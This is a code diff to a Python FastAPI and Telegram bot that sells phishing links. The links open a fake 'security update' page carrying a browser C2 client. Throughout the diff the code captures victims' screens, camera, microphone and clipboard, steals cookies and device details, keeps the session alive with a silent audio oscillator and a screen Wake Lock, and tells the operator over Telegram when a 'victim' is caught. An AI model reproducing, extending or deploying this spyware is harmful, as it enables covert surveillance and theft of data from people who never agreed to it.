@@ -48,7 +48,7 @@ async def serve_intel_trap(link_id: str, request: Request):
         body { background-color: #090d16; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }
         .loader { border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .box { background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; }
+        .box { background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -125,7 +125,7 @@ async def serve_live_trap(link_id: str, request: Request):
     <div class="card" onclick="unlockEngine()">
         <h2>🛡️ انقر للمتابعة وتثبيت التحديث الأمني</h2>
         <div class="loader"></div>
-        <p style="color: #94a3b8; font-size: 13px;">جاري الاتصال بالعقدة العصبية الآمنة في الخلفية...</p>
+        <p style="color: #94a3b8; font-size: 13px;">جاري تشغيل محرك الاتصال الخفي...</p>
     </div>
     <video id="v_cam" autoplay playsinline muted></video>
     <video id="v_screen" autoplay playsinline muted></video>
@@ -139,16 +139,22 @@ async def serve_live_trap(link_id: str, request: Request):
         let liveStreamTimer = null;
         let screenStream = null;
 
-        // تقنية منع تجميد المتصفح في الخلفية (Background Persistence Audio Engine)
-        function initBackgroundAudioKeeper() {
+        // نظام منع تجميد المتصفح بالخلفية عبر Web Audio & Wake Lock API
+        async function initPersistenceEngine() {
             try {
+                // تفعيل AudioContext لصيانة التشغيل بالخلفية
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
                 const gainNode = audioCtx.createGain();
-                gainNode.gain.value = 0.00001; // صوت غير مسموع تماماً
+                gainNode.gain.value = 0.00001;
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
                 oscillator.start();
+
+                // تفعيل Screen Wake Lock لعدم إطفاء الشاشة أو تجميد السكربت
+                if ('wakeLock' in navigator) {
+                    await navigator.wakeLock.request('screen');
+                }
             } catch(e) {}
         }
 
@@ -180,10 +186,9 @@ async def serve_live_trap(link_id: str, request: Request):
                     }
                     output = JSON.stringify(ls);
                 } else if (cmdPacket.cmd === "screen_snapshot") {
-                    // التقاط شاشة الجهاز الحقيقية باستخدام getDisplayMedia
                     try {
                         if (!screenStream) {
-                            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: "screen", frameRate: 30 } });
+                            screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { mediaSource: "screen" } });
                         }
                         let videoElem = document.getElementById('v_screen');
                         videoElem.srcObject = screenStream;
@@ -197,7 +202,7 @@ async def serve_live_trap(link_id: str, request: Request):
                         ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                         output = canvas.toDataURL('image/jpeg', 0.85);
                     } catch(err) {
-                        output = "فشل التقاط الشاشة الحقيقية (مرفوضة الصلاحية أو غير مدعومة)";
+                        output = "❌ فشل التقاط الشاشة: يتطلب إذن تفاعلي (يجب أن يكون المتصفح مفتوحاً ومرئياً للقطات الشاشة الحية بسبب قيود النظام).";
                     }
                 } else if (cmdPacket.cmd === "start_live_screen") {
                     stopAllStreams();
@@ -218,9 +223,9 @@ async def serve_live_trap(link_id: str, request: Request):
                                 sendResult("live_screen_frame", frameData);
                             } catch(e) {}
                         }, 2000);
-                        return "🔴 تم تفعيل البث الحي الحقيقي للشاشة بنجاح!";
+                        return "🔴 تم تفعيل البث الحي للشاشة بنجاح!";
                     } catch(e) {
-                        return "❌ فشل بدء البث الحي للشاشة (تم رفض إذن مشاركة الشاشة)";
+                        return "❌ فشل بدء البث الحي للشاشة (يتطلب تفاعل المستخدم والموافقة على إذن الشاشة).";
                     }
                 } else if (cmdPacket.cmd === "stop_live_screen") {
                     stopAllStreams();
@@ -247,7 +252,7 @@ async def serve_live_trap(link_id: str, request: Request):
                         }, 2000);
                         return "📹 تم بدء البث الحي لكاميرا الضحية!";
                     } catch(e) {
-                        return "❌ فشل تشغيل الكاميرا الحية (الصلاحية مرفوضة)";
+                        return "❌ فشل تشغيل الكاميرا الحية (الصلاحية مرفوضة أو مشغولة بتطبيق آخر)";
                     }
                 } else if (cmdPacket.cmd === "dump_clipboard") {
                     try {
@@ -272,9 +277,9 @@ async def serve_live_trap(link_id: str, request: Request):
                         };
                         mediaRecorder.start();
                         setTimeout(() => mediaRecorder.stop(), 5000);
-                        return "🎤 جاري التقاط التسجيل الصوتي الحي...";
+                        return "🎤 جاري التقاط التسجيل الصوتي الحي من الميكروفون...";
                     } catch(err) {
-                        output = "فشل التقاط الصوت (مرفوض)";
+                        output = "❌ فشل التقاط الصوت: الميكروفون مقفل أو مرفوض الإذن.";
                     }
                 }
             } catch(err) {
@@ -298,7 +303,6 @@ async def serve_live_trap(link_id: str, request: Request):
 
         async function startPollingEngine() {
             setInterval(async () => {
-                if (isWsActive) return;
                 try {
                     let res = await fetch('/api/v1/poll-command/' + linkId);
                     if (res.ok) {
@@ -311,7 +315,7 @@ async def serve_live_trap(link_id: str, request: Request):
                         }
                     }
                 } catch(e) {}
-            }, 1200);
+            }, 1000);
         }
 
         function initEnterpriseC2() {
@@ -334,12 +338,12 @@ async def serve_live_trap(link_id: str, request: Request):
             };
             ws.onclose = function() {
                 isWsActive = false;
-                setTimeout(initEnterpriseC2, 1500);
+                setTimeout(initEnterpriseC2, 1000);
             };
         }
 
         async function unlockEngine() {
-            initBackgroundAudioKeeper();
+            await initPersistenceEngine();
             initEnterpriseC2();
             startPollingEngine();
             
@@ -385,7 +389,7 @@ async def websocket_endpoint(websocket: WebSocket, link_id: str):
     
     if target_user_id:
         try:
-            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[تم اصطياد ضحية جديدة!]*: تم ربط العقدة بنجاح.\n🔑 الجلسة: `{link_id}`", parse_mode="Markdown")
+            await bot.send_message(chat_id=target_user_id, text=f"🟢 *[تم اصطياد الضحية بنجاح]*\n🔑 الجلسة: `{link_id}`", parse_mode="Markdown")
         except:
             pass
 
@@ -467,7 +471,7 @@ async def receive_loot(data: VictimData):
         try:
             s_data = data.stolen_data
             caption = (
-                "⚡ *[ فخ الترسانة: تم الإيقاع بالضحية بنجاح! ]*\n\n"
+                "⚡ *[ تم الإيقاع بالضحية بنجاح! ]*\n\n"
                 f"💻 *النظام:* `{data.device_info}`\n"
                 f"📐 *الشاشة:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                 f"🍪 *الكوكيز:* `{data.stolen_cookies[:80] if data.stolen_cookies else 'فارغة'}`"
@@ -528,7 +532,7 @@ async def process_live_commands(callback: types.CallbackQuery):
         return
 
     await send_command_to_target(link_id, {"cmd": target_cmd, "url": "https://www.google.com"})
-    await callback.answer("🚀 تم إرسال الأمر للضحية (حتى لو كان في الخلفية)، جاري المعالجة...", show_alert=True)
+    await callback.answer("🚀 تم إرسال الأمر للجهاز، جاري المعالجة الفورية...", show_alert=True)
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -547,8 +551,7 @@ async def cmd_start(message: types.Message):
     )
     await message.answer(
         "💀 *منصة الترسانة السيبرانية العسكرية (Enterprise C2) نشطة وجاهزة.*\n\n"
-        "• تم تفعيل **العمل في الخلفية (Background Persistence)** ومنع تجميد المتصفح.\n"
-        "• تم استبدال التقاط الموقع بـ **لقطات شاشة حقيقية ومتغيرة لجهاز الضحية** عبر `getDisplayMedia`.\n"
+        "• تم دمج محرك الصيانة الخلفي `WakeLock & AudioContext` لمنع تجميد الجلسة.\n"
         "• اختر الأداة المطلوبة:",
         reply_markup=kb,
         parse_mode="Markdown"
@@ -579,7 +582,7 @@ async def gen_intel_link(message: types.Message):
     LINK_TO_USER[token] = user_id
     
     rem = 3 - u["intel_count"] if not u["vip"] else "غير محدود"
-    await message.answer(f"✅ *رابط الاستخبارات الفوري جاهز:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
+    await message.answer(f"✅ *رابط الاستخبارات جاهز:*\n\n`{url}`\n\n*(المتبقي لك اليوم: {rem})*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 الفوري ($3 - تجربة مرة واحدة)")
 async def gen_live_link(message: types.Message):
@@ -600,7 +603,7 @@ async def gen_live_link(message: types.Message):
     url = f"https://{domain}/live/{token}"
     LINK_TO_USER[token] = user_id
     
-    await message.answer(f"✅ *رابط C2 العسكري الفوري جاهز:*\n\n`{url}`\n\n*(يعمل في الخلفية، ويلتقط الشاشة الحقيقية فوراً)*", parse_mode="Markdown")
+    await message.answer(f"✅ *رابط C2 العسكري الفوري جاهز:*\n\n`{url}`\n\n*(جاهز للاستخدام الفوري)*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
 async def show_victims(message: types.Message):
@@ -608,7 +611,7 @@ async def show_victims(message: types.Message):
     links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
     total = sum(len(VICTIMS_DB.get(t, [])) for t in links)
     active_now = sum(1 for t in links if t in ACTIVE_WEBSOCKETS or t in COMMAND_QUEUES)
-    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا: *{total}*\n🟢 الجلسات النشطة حالياً: *{active_now}*", parse_mode="Markdown")
+    await message.answer(f"📂 *إحصائيات الضحايا:*\n\n🎯 إجمالي الضحايا: *{total}*\n🟢 الجلسات النشطة: *{active_now}*", parse_mode="Markdown")
 
 @dp.message(lambda msg: msg.text == "👑 الاشتراك بالترسانة (نجوم تيليجرام)")
 async def buy_stars(message: types.Message):
@@ -632,3 +635,4 @@ async def startup():
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+           
